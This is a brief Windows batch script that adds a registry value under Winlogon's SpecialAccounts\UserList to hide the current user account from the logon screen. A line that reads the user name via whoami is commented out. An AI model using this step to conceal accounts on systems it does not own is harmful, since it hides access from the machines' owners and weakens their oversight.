@REM encoding:OEM
rem FOR /F "usebackq delims=\ tokens=2" %%I IN (`whoami`) DO SET FullUserName=%%~I
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%UserName%" /t REG_DWORD /d 0 /f
